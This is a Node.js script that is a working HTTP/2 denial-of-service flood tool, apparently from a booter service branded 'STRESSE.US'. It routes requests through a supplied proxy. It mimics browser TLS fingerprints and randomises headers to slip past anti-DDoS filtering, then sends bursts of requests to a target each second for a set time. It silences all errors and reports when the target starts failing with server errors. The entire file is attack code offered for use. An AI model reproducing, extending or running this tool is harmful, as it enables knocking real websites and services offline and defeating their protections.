const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const crypto = require('crypto');
const fs = require('fs');
const url = require('url');
const yargs = require('yargs');

const headersArg = {
	alias: 'h',
	describe: '"header@value"',
	array: true,
	demandOption: false
};

const args = yargs.options({ headers: headersArg }).argv;

function parseHeaders(headers) {
	const result = {};
	headers.forEach(header => {
		const [name, value] = header.split('@');
		result[name] = value;
	});
	return result;
}

const [target, time, ratelimit, proxy] = process.argv.slice(2);
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const ciphers = `ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-ECDSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-ECDHE-ECDSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-ECDHE-RSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-ECDHE-ECDSA-WITH-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-AES128-CBC-SHA:ECDHE-ECDSA-ECDHE-RSA-WITH-AES256-CBC-SHA:ECDHE-ECDSA-RSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-RSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-RSA-WITH-AES128-CBC-SHA:ECDHE-ECDSA-RSA-WITH-AES256-CBC-SHA`;
const sigalgs = `ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512`;
this.ecdhCurve = `GREASE:x25519:secp256r1:secp384r1`;
this.sigalgss = sigalgs;
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: this.sigalgss,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: "TLS_client_method",
};
const secureContext = tls.createSecureContext(secureContextOptions);

if(target == undefined) { 
	console.log('[STRESSE.US] Target Time Threads Ratelimit Proxyfile [STRESSE.FUN]');
	process.exit(-1);
}

const parsed = url.parse(target);

process.on('uncaughtException',  function(error) {});
process.on('unhandledRejection', function(error) {});

function jathreerandom() {
	const lang = ["af", "am", "ar", "az", "be", "bg", "bn", "bs", "ca", "cs", "cy", "da", "de", "el", "en", "en-GB", "en-US", "eo", "es", "et", "eu", "fa", "fi", "fil", "fj", 'ko-KR', 'en-US', 'zh-CN', 'zh-TW', 'ja-JP', 'en-GB', 'en-AU', 'en-CA', 'en-NZ', 'en-ZA', 'en-IN', 'en-PH', 'en-SG', 'en-ZA', 'en-HK', 'en-US', '*', 'en-US,en;q=0.5', 'utf-8, iso-8859-1;q=0.5, *;q=0.1', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-GB, en-US, en;q=0.9', 'de-AT, de-DE;q=0.9, en;q=0.5', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5', 'da, en-gb;q=0.8, en;q=0.7', 'cs;q=0.5'];
	const fetch = ['none', 'same-origin'];
	const options = ["document", "embed", "font", "image", "manifest", "media", "object", "report", "script", "serviceworker", "sharedworker", "style", "worker", "xslt"];
	const modes = ["cors", "navigate", "no-cors", "same-origin", "websocket"];
	const random_1 = lang[Math.floor(Math.random() * lang.length)];
	const random_2 = fetch[Math.floor(Math.random() * fetch.length)];
	const random_3 = options[Math.floor(Math.random() * options.length)];
	const random_4 = modes[Math.floor(Math.random() * modes.length)];
	
	
	const headers = {		
		":method": "GET",
		":authority": parsed.host,
		":scheme": "https",
		":path": parsed.path + '?lang=' + random_1,
		"sec-ch-ua": parseHeaders(args.headers)['sec-ch-ua'],
		"sec-ch-ua-mobile": "?0",
		"sec-ch-ua-platform": `"Linux"`,
		"upgrade-insecure-requests": "1",
		"user-agent": parseHeaders(args.headers)['user-agent'],
		"accept": parseHeaders(args.headers)['accept'],
		"sec-fetch-site": random_2,
		"sec-fetch-mode": random_4,
		"sec-fetch-user": '?1',
		"sec-fetch-dest": random_3,
		"accept-encoding": parseHeaders(args.headers)['accept-encoding'],
		"accept-language": random_1,
		"cookie": parseHeaders(args.headers)['cookie'],
	}
	
	return headers;
}

function flood() {
	let proxies = proxy.split(':');
	
	const agent = new http.Agent({
		keepAlive: false,
		maxSockets: Infinity,
		maxTotalSockets: Infinity
	});	
	
	setInterval( () => {
		const request = http.get({
			method: "CONNECT",
			host: proxies[0],
			port: proxies[1],
			agent: agent,
			path: parsed.host + ":443",
			ciphers: ciphers,
			sigalgs: this.sigalgss,
			ecdhCurve: this.ecdhCurve,
			ALPNProtocols: ['h2', 'http/1.1'],
		});
		
		request.on('connect', (err, info) => {
			http2.connect(target, {
				createConnection: () => tls.connect({
					rejectUnauthorized: false,
					host: parsed.host + ":443",
					servername: parsed.host,
					secureOptions: secureOptions,
					minVersion: 'TLSv1.2',
					ciphers: ciphers,
					sigalgs: this.sigalgss,
					ecdhCurve: this.ecdhCurve,
					honorCipherOrder: false, 
					requestCert: true,
					socket: info,
					secure: true,
					ALPNProtocols: ['h2', 'http/1.1'],
					secureProtocol: "TLS_client_method",
					secureContext: secureContext,
					gzip: true,
					allowHTTP1: true,
					isServer: false,
				}),
				settings: {
				  headerTableSize: 65536,
				  enablePush: false,
				  maxConcurrentStreams: 1000,
				  initialWindowSize: 6291456,
				  maxHeaderListSize: 262144,
				},	
			}, (session) => {	
				for(let i = 0; i < ratelimit; i++) {
					const req = session.request(jathreerandom());
					req.setEncoding('utf8');
					req.on('data', (chunk) => {});
					req.on("response", (gb) => {
						if(['500','502', '503', '522', '499'].includes(gb[":status"])) {
							console.log('[Anti HTTP-DDoS] ' + gb[":status"]);
							i = ratelimit;
							req.close();
							req.end();
						}				
						req.close();
					});
					req.end();				
				}
			})
		})
		request.end();
	}, 1000)
}

flood();
setTimeout(function() {
	console.clear();
	process.exit(-1)
}, time * 1000);